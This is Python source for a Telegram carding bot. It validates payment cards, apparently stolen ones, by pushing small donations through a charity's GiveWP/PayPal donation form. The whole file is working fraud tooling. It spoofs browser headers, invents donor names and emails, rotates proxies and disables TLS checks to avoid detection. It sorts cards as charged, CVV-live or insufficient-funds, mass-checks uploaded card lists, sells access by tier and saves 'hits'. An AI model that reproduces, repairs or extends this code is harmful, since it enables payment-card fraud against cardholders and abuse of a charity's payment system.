def _princess_gen_browser():
    cv = random.choice(_PRINCESS_CHROME_VERS)
    major = cv.split('.')[0]
    os_str, plat = random.choice(_PRINCESS_OS_LIST)
    ua = f'Mozilla/5.0 ({os_str}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{cv} Mobile Safari/537.36'
    sec_ua = f'"Chromium";v="{major}", "Not/A)Brand";v="24"'
    return ua, sec_ua, plat


def _princess_gen_identity():
    fn = random.choice(_PRINCESS_FIRST)
    ln = random.choice(_PRINCESS_LAST)
    sep = random.choice(['.', '_', '-', ''])
    num = random.randint(10, 9999)
    email = f'{fn.lower()}{sep}{ln.lower()}{num}@{random.choice(_PRINCESS_DOMAINS)}'
    return fn, ln, email


async def _princess_safe_json(resp):
    try:
        text = await resp.text()
    except:
        return None, ""
    if not text or not text.strip():
        return None, text
    try:
        return json.loads(text), text
    except Exception:
        return None, text


async def _princess_retry_post(session, url, retries=2, delay=2.0, **kwargs):
    last_err = None
    for attempt in range(retries + 1):
        try:
            async with session.post(url, **kwargs) as resp:
                data, raw = await _princess_safe_json(resp)
                if data is not None:
                    return data, raw, resp.status
                if attempt < retries:
                    await asyncio.sleep(delay + random.uniform(0.5, 1.5))
                    continue
                return None, raw, resp.status
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            last_err = e
            if attempt < retries:
                await asyncio.sleep(delay + random.uniform(0.5, 1.5))
                continue
    raise last_err or Exception("Retry exhausted")


async def check_card_princess(cc: str, mm: str, yy: str, cvv: str, user_proxies: Optional[List[str]] = None) -> dict:
    """
    Check card using Princess For A Day PayPal Gateway
    """
    start_time = time.time()

    if len(yy) == 4:
        yy = yy[2:]
    if len(mm) == 1:
        mm = f'0{mm}'

    # Get proxy
    proxy_url = None
    if user_proxies and len(user_proxies) > 0:
        proxy_url = user_proxies[0]
        if proxy_url and not proxy_url.startswith(('http://', 'https://')):
            proxy_url = f'http://{proxy_url}'

    ua, sec_ua, plat = _princess_gen_browser()
    fn, ln, email = _princess_gen_identity()
    lang = random.choice(_PRINCESS_ACCEPT_LANGS)
    metadata_id = uuid.uuid4().hex

    connector = None
    try:
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        jar = aiohttp.CookieJar()
        connector = aiohttp.TCPConnector(ssl=ssl_context)
        timeout = aiohttp.ClientTimeout(total=90)

        async with aiohttp.ClientSession(cookie_jar=jar, connector=connector, timeout=timeout) as session:

            base_headers = {
                'origin': PRINCESS_SITE_URL,
                'referer': PRINCESS_DONATE_PAGE,
                'sec-ch-ua': sec_ua,
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': plat,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': ua,
                'accept-language': lang,
                'x-requested-with': 'XMLHttpRequest',
            }

            print(f"📡 [Princess] Fetching donation page...")
            
            try:
                async with session.get(PRINCESS_DONATE_PAGE, headers=base_headers, proxy=proxy_url) as resp:
                    page_html = await resp.text()
                    print(f"📥 [Princess] Page status: {resp.status}")
            except aiohttp.ClientConnectorError as e:
                if proxy_url:
                    print(f"🔄 [Princess] Proxy failed, retrying without proxy...")
                    async with session.get(PRINCESS_DONATE_PAGE, headers=base_headers) as resp:
                        page_html = await resp.text()
                        print(f"📥 [Princess] Page status (no proxy): {resp.status}")
                else:
                    raise

            if not page_html or len(page_html) < 100:
                return {'status': 'error', 'message': 'Page too short or empty', 'time': time.time() - start_time}

            # Extract form fields
            id_form1_m = re.search(r'name="give-form-id-prefix" value="(.*?)"', page_html)
            id_form2_m = re.search(r'name="give-form-id" value="(.*?)"', page_html)
            nonec_m = re.search(r'name="give-form-hash" value="(.*?)"', page_html)
            enc_m = re.search(r'"data-client-token":"(.*?)"', page_html)

            if not all([id_form1_m, id_form2_m, nonec_m, enc_m]):
                return {'status': 'error', 'message': 'Failed to parse donation page', 'time': time.time() - start_time}

            id_form1 = id_form1_m.group(1)
            id_form2 = id_form2_m.group(1)
            nonec = nonec_m.group(1)

            # Decode client token and get access token
            try:
                dec = base64.b64decode(enc_m.group(1)).decode('utf-8')
                au_m = re.search(r'"accessToken":"(.*?)"', dec)
                if not au_m:
                    return {'status': 'error', 'message': 'Failed to get PayPal access token', 'time': time.time() - start_time}
                au = au_m.group(1)
                print(f"✅ [Princess] Got PayPal token: {au[:20]}...")
            except Exception as e:
                return {'status': 'error', 'message': f'Token decode error: {str(e)[:50]}', 'time': time.time() - start_time}

            # ============ FIX: Initialize payment with proper flow ============
            # Step 1: Initialize the donation
            init_data = {
                'give-honeypot': '',
                'give-form-id-prefix': id_form1,
                'give-form-id': id_form2,
                'give-form-title': '',
                'give-current-url': PRINCESS_DONATE_PAGE,
                'give-form-url': PRINCESS_DONATE_PAGE,
                'give-form-minimum': '1.00',
                'give-form-maximum': '999999.99',
                'give-form-hash': nonec,
                'give-price-id': '3',
                'give-recurring-logged-in-only': '',
                'give-logged-in-only': '1',
                '_give_is_donation_recurring': '0',
                'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
                'give-amount': '1.00',
                'give_stripe_payment_method': '',
                'payment-mode': 'paypal-commerce',
                'give_first': fn,
                'give_last': ln,
                'give_email': email,
                'card_name': fn,
                'card_exp_month': '',
                'card_exp_year': '',
                'give_action': 'purchase',
                'give-gateway': 'paypal-commerce',
                'action': 'give_process_donation',
                'give_ajax': 'true',
            }

            async with session.post(
                f'{PRINCESS_SITE_URL}/wp-admin/admin-ajax.php',
                headers=base_headers,
                data=init_data,
                proxy=proxy_url
            ) as resp:
                init_response = await resp.text()
                print(f"📥 [Princess] Init response status: {resp.status}")

            # Step 2: Create order
            base_form = {
                'give-honeypot': '',
                'give-form-id-prefix': id_form1,
                'give-form-id': id_form2,
                'give-form-title': '',
                'give-current-url': PRINCESS_DONATE_PAGE,
                'give-form-url': PRINCESS_DONATE_PAGE,
                'give-form-minimum': PRINCESS_AMOUNT,
                'give-form-maximum': '999999.99',
                'give-form-hash': nonec,
                'give-price-id': '3',
                'give-recurring-logged-in-only': '',
                'give-logged-in-only': '1',
                '_give_is_donation_recurring': '0',
                'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
                'give-amount': PRINCESS_AMOUNT,
                'give_stripe_payment_method': '',
                'payment-mode': 'paypal-commerce',
                'give_first': fn,
                'give_last': ln,
                'give_email': email,
                'card_name': fn,
                'card_exp_month': '',
                'card_exp_year': '',
                'give-gateway': 'paypal-commerce',
            }

            mp_headers = {
                'origin': PRINCESS_SITE_URL,
                'referer': PRINCESS_DONATE_PAGE,
                'sec-ch-ua': sec_ua,
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': plat,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': ua,
                'accept-language': lang,
            }

            def build_form_data():
                fd = aiohttp.FormData()
                for k, v in base_form.items():
                    fd.add_field(k, v)
                return fd

            order_data, order_raw, order_status = await _princess_retry_post(
                session,
                f'{PRINCESS_SITE_URL}/wp-admin/admin-ajax.php',
                retries=2, delay=2.0,
                params={'action': 'give_paypal_commerce_create_order'},
                headers=mp_headers,
                data=build_form_data(),
                proxy=proxy_url
            )

            if not order_data:
                return {'status': 'error', 'message': f'Empty order response (HTTP {order_status})', 'time': time.time() - start_time}

            tok = order_data.get('data', {}).get('id')
            if not tok:
                return {'status': 'error', 'message': 'Failed to create PayPal order', 'time': time.time() - start_time}
            
            print(f"✅ [Princess] Created order: {tok}")

            # ============ FIX: Use the correct PayPal API endpoint with proper auth ============
            paypal_headers = {
                'authority': 'cors.api.paypal.com',
                'accept': '*/*',
                'accept-language': lang,
                'authorization': f'Bearer {au}',
                'braintree-sdk-version': '3.32.0-payments-sdk-dev',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'paypal-client-metadata-id': metadata_id,
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': sec_ua,
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': plat,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': ua,
            }

            # ============ FIX: Check if token is valid before proceeding ============
            # Test the token with a simple request if needed
            print(f"🔍 [Princess] Testing PayPal token...")
            
            json_data = {
                'payment_source': {
                    'card': {
                        'number': cc,
                        'expiry': f'20{yy}-{mm}',
                        'security_code': cvv,
                        'attributes': {
                            'verification': {'method': 'SCA_WHEN_REQUIRED'},
                        },
                    },
                },
                'application_context': {'vault': False},
            }

            async with session.post(
                f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
                headers=paypal_headers,
                json=json_data,
            ) as resp:
                confirm_text = await resp.text()
                confirm_status = resp.status
                
                print(f"\n{'='*80}")
                print(f"🔍 [PRINCESS DEBUG] PayPal Confirm Response")
                print(f"📊 Status Code: {confirm_status}")
                print(f"📝 Raw Response:")
                print(f"{confirm_text[:2000]}")
                print(f"{'='*80}\n")

            # ============ FIX: Handle token expiration ============
            if confirm_status == 401:
                print(f"⚠️ [Princess] Token expired, refreshing...")
                # Token expired - need to get a new one
                # The site should provide a new token in the page
                return {'status': 'error', 'message': 'PayPal token expired - try again', 'time': time.time() - start_time}

            if confirm_status == 422:
                print(f"⚠️ [Princess] Unprocessable entity - card may be declined or invalid")
                # Check if it's a card decline vs other error
                try:
                    error_data = json.loads(confirm_text)
                    error_msg = error_data.get('error', {}).get('message', 'Card declined')
                    return {'status': 'dead', 'message': f'Card declined: {error_msg}', 'time': time.time() - start_time}
                except:
                    return {'status': 'dead', 'message': 'Card declined', 'time': time.time() - start_time}
            
            if confirm_status >= 500:
                print(f"⚠️ [Princess] Server error, retrying...")
                return {'status': 'error', 'message': 'Server error, try again', 'time': time.time() - start_time}
            
            if not confirm_text.strip():
                return {'status': 'error', 'message': 'Empty PayPal confirm response', 'time': time.time() - start_time}

            # ============ FIX: Only call approve if confirm was successful ============
            # Check if confirm was successful (status 200-299 and no errors)
            try:
                confirm_json = json.loads(confirm_text)
                if confirm_json.get('error'):
                    error_msg = confirm_json['error'].get('message', 'Card declined')
                    return {'status': 'dead', 'message': f'Card declined: {error_msg}', 'time': time.time() - start_time}
            except:
                pass

            # Only approve if confirm was successful
            if confirm_status < 300:
                approve_data, approve_raw, approve_status = await _princess_retry_post(
                    session,
                    f'{PRINCESS_SITE_URL}/wp-admin/admin-ajax.php',
                    retries=2, delay=2.0,
                    params={'action': 'give_paypal_commerce_approve_order', 'order': tok},
                    headers=mp_headers,
                    data=build_form_data(),
                    proxy=proxy_url
                )
            else:
                approve_data = None
                approve_raw = ""
                approve_status = confirm_status

            print(f"\n{'='*80}")
            print(f"🔍 [PRINCESS DEBUG] Final Approve Response")
            print(f"📊 Status Code: {approve_status}")
            print(f"📝 Response Data:")
            print(f"{json.dumps(approve_data, indent=2) if approve_data else 'No data'}")
            print(f"{'='*80}\n")

            text = approve_raw if approve_raw else confirm_text if confirm_text else ''

        elapsed = time.time() - start_time

        print(f"\n{'='*80}")
        print(f"🔍 [PRINCESS DEBUG] Final Status Before Parsing")
        print(f"📝 text length: {len(text) if text else 0}")
        print(f"📝 text preview: {text[:500] if text else 'EMPTY'}")
        print(f"📝 approve_data: {approve_data if approve_data else 'None'}")
        print(f"{'='*80}\n")

        # ============ FIX: Parse response properly ============
        if text:
            text_lower = text.lower()
            
            # Check for actual charge confirmation
            # Look for success indicators
            success_indicators = [
                '"status":"completed"',
                '"status":"approved"', 
                '"payment_status":"completed"',
                '"state":"completed"',
                '"intent":"capture"',
                '"success":true'
            ]
            
            # Check for decline indicators
            decline_indicators = [
                '"error"',
                '"declined"',
                '"rejected"',
                '"ORDER_NOT_APPROVED"',
                '"UNPROCESSABLE_ENTITY"',
                '"invalid_token"'
            ]
            
            is_success = any(ind in text_lower for ind in success_indicators)
            is_decline = any(ind in text_lower for ind in decline_indicators)
            
            # Check approve_data if available
            if approve_data and isinstance(approve_data, dict):
                if approve_data.get('success') == True:
                    is_success = True
                elif approve_data.get('success') == False:
                    is_decline = True
            
            print(f"🔍 [PRINCESS DEBUG] Parsing result:")
            print(f"   is_success: {is_success}")
            print(f"   is_decline: {is_decline}")
            
            if is_success and not is_decline:
                print(f"✅ [PRINCESS DEBUG] Card CHARGED!")
                return {'status': 'charged', 'message': f'Charged ${PRINCESS_AMOUNT}', 'time': elapsed}
            
            # Check for specific error types
            if 'insufficient_funds' in text_lower or 'insufficient funds' in text_lower:
                print(f"💰 [PRINCESS DEBUG] INSUFFICIENT FUNDS!")
                return {'status': 'approved', 'message': 'Insufficient Funds', 'time': elapsed}
            
            if 'cvv2_failure' in text_lower or 'cvv' in text_lower:
                print(f"✅ [PRINCESS DEBUG] CVV LIVE!")
                return {'status': 'ccn', 'message': 'CVV Live', 'time': elapsed}
            
            if 'expired_card' in text_lower or 'expired' in text_lower:
                print(f"❌ [PRINCESS DEBUG] EXPIRED CARD!")
                return {'status': 'dead', 'message': 'Expired Card', 'time': elapsed}
            
            if 'do_not_honor' in text_lower:
                print(f"❌ [PRINCESS DEBUG] DO NOT HONOR!")
                return {'status': 'dead', 'message': 'Do Not Honor', 'time': elapsed}
            
            # If there's an error or decline, return declined
            if is_decline or 'error' in text_lower:
                # Try to extract the error message
                try:
                    error_data = json.loads(text)
                    error_msg = error_data.get('error', {}).get('message', 'Card declined')
                    if error_data.get('data', {}).get('error', {}).get('details'):
                        detail = error_data['data']['error']['details'][0]
                        error_msg = detail.get('description', error_msg)
                    print(f"❌ [PRINCESS DEBUG] DECLINED: {error_msg}")
                    return {'status': 'dead', 'message': f'Card declined: {error_msg}', 'time': elapsed}
                except:
                    print(f"❌ [PRINCESS DEBUG] DECLINED (no details)")
                    return {'status': 'dead', 'message': 'Card Declined', 'time': elapsed}

        print(f"⚠️ [PRINCESS DEBUG] UNKNOWN RESPONSE - treating as declined")
        return {'status': 'dead', 'message': 'Card Declined', 'time': elapsed}

    except aiohttp.ClientConnectorError as e:
        print(f"❌ [Princess] Connection error: {e}")
        if proxy_url:
            print(f"🔄 [Princess] Retrying without proxy...")
            return await check_card_princess(cc, mm, yy, cvv, None)
        return {'status': 'error', 'message': f'Connection error: {str(e)[:50]}', 'time': time.time() - start_time}
    except asyncio.TimeoutError:
        print(f"⏰ [Princess] Timeout")
        return {'status': 'error', 'message': 'Request timed out', 'time': time.time() - start_time}
    except Exception as e:
        print(f"❌ [Princess] Error: {e}")
        import traceback
        traceback.print_exc()
        return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': time.time() - start_time}
    finally:
        if connector and not connector.closed:
            await connector.close()
            
            
# ============ PRINCESS GATEWAY COMMANDS ============

async def single_check_princess(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single card check with Princess For A Day PayPal gateway - /pp1"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text(
            "💳 <b>Princess For A Day PayPal Gateway</b>\n\n"
            "Usage: <code>/pp1 &lt;card&gt;</code>\n"
            "Example: <code>/pp1 4242424242424242|12|2028|123</code>\n\n"
            "💰 Amount: $2.00\n"
            "📍 Gateway: PayPal via Princess For A Day\n"
            "🔐 Checks: Charged, CVV, Insufficient Funds",
            parse_mode=ParseMode.HTML
        )
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    card_text = " ".join(context.args).strip()
    
    # Extract card
    card = card_formatter.extract_single_card_from_text(card_text)
    if not card:
        await message.reply_text(
            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
            "Example: 4242424242424242|12|2028|123"
        )
        return
    
    # Check credits
    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
    if not can_proceed:
        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
        return
    
    # Check gateway access
    if not user_manager.can_access_gateway(user_id, 'paypal'):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f"❌ <b>Princess Gateway not available for {tier.upper()} tier</b>\n\n"
            f"Upgrade to Premium/Ultimate to use this gateway.",
            parse_mode=ParseMode.HTML
        )
        add_user_credits(user_id, 1)
        return
    
    princess_active_tasks[user_id] = True
    
    try:
        tier = user_manager.get_tier(user_id)
        if user_id not in user_speed_controllers:
            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[user_id]
        
        status_msg = await message.reply_text("🔄 Checking card with Princess PayPal Gateway...")
        
        await speed_controller.wait_if_needed()
        start = time.time()
        
        # Parse card
        parts = card.split('|')
        cc, mm, yy, cvv = parts
        
        # Get proxy if allowed
        user_proxies = None
        if user_manager.can_use_proxy(user_id):
            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
                user_proxies = autosopi_proxy_tracker.working_proxies[user_id]
        
        result = await check_card_princess(cc, mm, yy, cvv, user_proxies)
        
        elapsed = time.time() - start
        speed_controller.record_response(elapsed)
        
        # Get BIN info
        bin_info = await get_bin_info(card)
        
        try:
            await status_msg.delete()
        except:
            pass
        
        # Format result
        status = result.get('status', 'unknown')
        message_text = result.get('message', 'Unknown')
        result_time = result.get('time', elapsed)
        
        # Parse card for display
        card_parts = card.split('|')
        card_num = card_parts[0] if len(card_parts) > 0 else card
        exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
        exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
        exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
        cvv_display = card_parts[3] if len(card_parts) > 3 else "XXX"
        
        bin_text, bank, country, _, _ = bin_info
        
        # Determine status display
        if status == 'charged':
            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
            status_display = "CHARGED"
            final_status = "charged"
        elif status == 'approved':
            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
            status_display = "APPROVED"
            final_status = "approved"
        elif status == 'ccn':
            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
            status_display = "CVV LIVE"
            final_status = "approved"
        else:
            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
            status_display = "DECLINED"
            final_status = "declined"
        
        # Build output
        output = (
            f"┏━━━━━━━⍟\n"
            f"┃ {status_emoji} {status_display}\n"
            f"┗━━━━━━━━━━━⊛\n\n"
            f"<b>Card</b> ↣ <code>{card_num}|{exp_month}|{exp_year_short}|{cvv_display}</code>\n"
            f"<b>Gateway</b> ↣ Princess PayPal\n"
            f"<b>Amount</b> ↣ $2.00\n"
            f"<b>Response</b> ↣ {message_text[:80]}\n"
            f"<b>BIN</b> ↣ {bin_text}\n"
            f"<b>Bank</b> ↣ {bank}\n"
            f"<b>Country</b> ↣ {country}\n"
            f"<b>Time</b> ↣ {result_time:.2f}s"
        )
        
        await message.reply_text(output, parse_mode=ParseMode.HTML)
        
        # Save hit if charged
        if final_status in ['charged', 'approved']:
            await save_hit_to_file(
                card=card, gateway="Princess PayPal",
                response=message_text, price="$2.00",
                bin_info=bin_info, user_id=user_id, user_tier=tier
            )
            
            if final_status == 'charged':
                user_data = user_manager.get_user(user_id)
                await send_hit_notification(
                    context=context, gateway="Princess PayPal", card=card,
                    response=message_text, price="$2.00",
                    user=user_data, bin_info=bin_info, status_category="charged"
                )
                user_manager.increment_hits(user_id)
        
        user_manager.increment_checks(user_id)
        
        # Show remaining credits for free users
        if user_manager.get_tier(user_id) == 'free':
            remaining = get_user_credits(user_id)
            await message.reply_text(
                f"💎 <b>Credits Remaining: {remaining}</b>\n"
                f"Use /credits to check balance.",
                parse_mode=ParseMode.HTML
            )
        
    except Exception as e:
        try:
            await status_msg.delete()
        except:
            pass
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        print(f"❌ [Princess] Error: {traceback.format_exc()}")
        add_user_credits(user_id, 1)
    finally:
        princess_active_tasks.pop(user_id, None)


async def mass_check_princess(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass card check with Princess For A Day PayPal gateway - /mpp1"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    
    if user_id in princess_active_tasks:
        await message.reply_text(
            "⚠️ You already have an active Princess gateway session.\n"
            "Please wait for it to finish or use /stop to cancel.",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not user_manager.can_access_gateway(user_id, 'paypal'):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f"❌ Princess gateway not available for {tier.upper()} tier.",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not user_manager.can_mass_check(user_id):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f"❌ Mass check not available for {tier.upper()} tier.\n\n"
            f"Use /pp1 for single checks.\n"
            f"💎 Upgrade to Premium/Ultimate for mass checks.",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if reply to file
    if message.reply_to_message and message.reply_to_message.document:
        try:
            file = await message.reply_to_message.document.get_file()
            content = await file.download_as_bytearray()
            content = content.decode('utf-8', errors='ignore')
            
            cards = []
            for line in content.splitlines():
                line = line.strip()
                if line and not line.startswith('#'):
                    card = card_formatter.extract_single_card_from_text(line)
                    if card:
                        cards.append(card)
            
            if not cards:
                await message.reply_text("❌ No valid cards found in file.")
                return
                
            await message.delete()
            await mass_check_princess_logic(update, context, cards, None)
            return
            
        except Exception as e:
            await message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
            return
    
    # Handle direct text input
    if not context.args:
        await message.reply_text(
            "📦 <b>Princess PayPal Mass Check</b>\n\n"
            "Usage: <code>/mpp1 &lt;card1&gt; &lt;card2&gt; ...</code>\n"
            "Or reply to a .txt file with /mpp1\n\n"
            "Example: <code>/mpp1 4242424242424242|12|2028|123 4222222222222222|11|2026|456</code>\n\n"
            "💰 Amount: $2.00\n"
            "📍 Gateway: PayPal via Princess For A Day\n"
            "✅ Only charged/approved cards will be shown",
            parse_mode=ParseMode.HTML
        )
        return
    
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
    
    if not cards:
        await message.reply_text("❌ No valid cards found.")
        return
    
    # Check batch size limit
    max_batch = user_manager.get_max_batch_size(user_id)
    if len(cards) > max_batch:
        cards = cards[:max_batch]
        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating.")
    
    # Check credits for mass check
    can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
    if not can_proceed:
        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
        return
    
    try:
        await message.delete()
    except:
        pass
    
    await mass_check_princess_logic(update, context, cards, None)


async def mass_check_princess_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
    """Mass check logic for Princess PayPal gateway"""
    u_id = update.effective_user.id
    message = update.effective_message
    total = len(cards)
    
    print(f"\n{'='*80}")
    print(f"🚀 [PRINCESS MASS CHECK] Starting batch for user {u_id}")
    print(f"📊 Total cards: {total}")
    print(f"{'='*80}")
    
    # Get user's working proxies
    user_proxies = None
    if user_manager.can_use_proxy(u_id):
        if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
            user_proxies = autosopi_proxy_tracker.working_proxies[u_id]
            print(f"🔌 Found {len(user_proxies)} working proxies for rotation")
        else:
            print(f"⚠️ No working proxies found, using direct connection")
    
    stats = {
        "charged": 0,
        "approved": 0,
        "ccn": 0,
        "declined": 0,
        "errors": 0,
        "total": total,
        "processed": 0
    }
    
    start_time = time.time()
    proxy_index = 0
    
    try:
        princess_active_tasks[u_id] = True
        
        tier = user_manager.get_tier(u_id)
        
        CONCURRENCY = {
            "free": 2,
            "premium": 5,
            "ultimate": 10,
            "admin": 10,
        }.get(tier, 2)
        
        charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
        approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
        ccn_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
        dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
        errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
        
        if progress_msg is None:
            progress_text = (
                f"<b>Gateway</b> ➛ Princess PayPal ($2)\n"
                f"<b>Status</b> ➛ STARTING...\n"
                f"<b>Checked</b> ➛ 0/{total}\n"
                f"<b>Charged</b> ➛ 0 {charged_emoji}\n"
                f"<b>Approved</b> ➛ 0 {approved_emoji}\n"
                f"<b>CVV Live</b> ➛ 0 {ccn_emoji}\n"
                f"<b>Declined</b> ➛ 0 {dead_emoji}\n"
                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
                f"<b>Time</b> ➛ 0s"
            )
            progress_msg = await message.reply_text(progress_text, parse_mode=ParseMode.HTML)
        
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        semaphore = asyncio.Semaphore(CONCURRENCY)
        stats_lock = asyncio.Lock()
        processed_count = 0
        
        async def update_progress(current: int):
            if current > 0 and current < total and current % 10 != 0:
                return
            elapsed = int(time.time() - start_time)
            minutes = elapsed // 60
            seconds = elapsed % 60
            time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
            
            if current >= total:
                status_text = "FINISHED ✅"
            else:
                status_text = f"PROCESSING {current}/{total}"
            
            progress_text = (
                f"<b>Gateway</b> ➛ Princess PayPal ($2)\n"
                f"<b>Status</b> ➛ {status_text}\n"
                f"<b>Checked</b> ➛ {current}/{total}\n"
                f"<b>Charged</b> ➛ {stats['charged']} {charged_emoji}\n"
                f"<b>Approved</b> ➛ {stats['approved']} {approved_emoji}\n"
                f"<b>CVV Live</b> ➛ {stats['ccn']} {ccn_emoji}\n"
                f"<b>Declined</b> ➛ {stats['declined']} {dead_emoji}\n"
                f"<b>Errors</b> ➛ {stats['errors']} {errors_emoji}\n"
                f"<b>Time</b> ➛ {time_str}"
            )
            try:
                await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
            except:
                pass
        
        async def process_single_card(card: str, idx: int):
            nonlocal processed_count, proxy_index
            
            await asyncio.sleep(random.uniform(0.1, 0.3))
            
            async with semaphore:
                await speed_controller.wait_if_needed()
                start = time.time()
                
                # Get proxy for this card
                card_proxies = None
                if user_proxies:
                    card_proxies = [user_proxies[proxy_index % len(user_proxies)]]
                    proxy_index += 1
                
                # Parse card
                parts = card.split('|')
                cc, mm, yy, cvv = parts
                
                result = await check_card_princess(cc, mm, yy, cvv, card_proxies)
                elapsed = time.time() - start
                speed_controller.record_response(elapsed)
                
                bin_info = await get_bin_info(card)
                
                status = result.get('status', 'error')
                message_text = result.get('message', 'Unknown')
                
                async with stats_lock:
                    processed_count += 1
                    
                    if status == 'charged':
                        stats["charged"] += 1
                        stats["approved"] += 1
                        print(f"🔥 [CHARGED] {card[:20]}...")
                    elif status == 'approved':
                        stats["approved"] += 1
                        print(f"✅ [APPROVED] {card[:20]}...")
                    elif status == 'ccn':
                        stats["ccn"] += 1
                        print(f"💰 [CVV LIVE] {card[:20]}...")
                    elif status == 'dead':
                        stats["declined"] += 1
                        print(f"❌ [DECLINED - HIDDEN] {card[:20]}...")
                    else:
                        stats["errors"] += 1
                        print(f"⚠️ [ERROR] {card[:20]}...")
                    
                    if processed_count % 10 == 0 or processed_count == total:
                        await update_progress(processed_count)
                
                # ONLY SEND RESULT FOR CHARGED, APPROVED, OR CVV LIVE
                if status in ['charged', 'approved', 'ccn']:
                    # Parse card for display
                    card_parts = card.split('|')
                    card_num = card_parts[0] if len(card_parts) > 0 else card
                    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
                    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
                    exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
                    cvv_display = card_parts[3] if len(card_parts) > 3 else "XXX"
                    
                    bin_text, bank, country, _, _ = bin_info
                    
                    if status == 'charged':
                        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
                        status_display = "CHARGED"
                    elif status == 'approved':
                        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
                        status_display = "APPROVED"
                    else:
                        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
                        status_display = "CVV LIVE"
                    
                    output = (
                        f"┏━━━━━━━⍟\n"
                        f"┃ {status_emoji} {status_display}\n"
                        f"┗━━━━━━━━━━━⊛\n\n"
                        f"<b>Card</b> ↣ <code>{card_num}|{exp_month}|{exp_year_short}|{cvv_display}</code>\n"
                        f"<b>Gateway</b> ↣ Princess PayPal\n"
                        f"<b>Amount</b> ↣ $2.00\n"
                        f"<b>Response</b> ↣ {message_text[:80]}\n"
                        f"<b>BIN</b> ↣ {bin_text}\n"
                        f"<b>Bank</b> ↣ {bank}\n"
                        f"<b>Country</b> ↣ {country}\n"
                        f"<b>Time</b> ↣ {elapsed:.2f}s"
                    )
                    
                    try:
                        await message.reply_text(output, parse_mode=ParseMode.HTML)
                        print(f"📤 [SENT] {card[:20]}...")
                    except Exception as e:
                        print(f"❌ Error sending result: {e}")
                    
                    if status == 'charged':
                        await save_hit_to_file(
                            card=card, gateway="Princess PayPal",
                            response=message_text, price="$2.00",
                            bin_info=bin_info, user_id=u_id, user_tier=tier
                        )
                        
                        user_data = user_manager.get_user(u_id)
                        await send_hit_notification(
                            context=context, gateway="Princess PayPal", card=card,
                            response=message_text, price="$2.00",
                            user=user_data, bin_info=bin_info, status_category="charged"
                        )
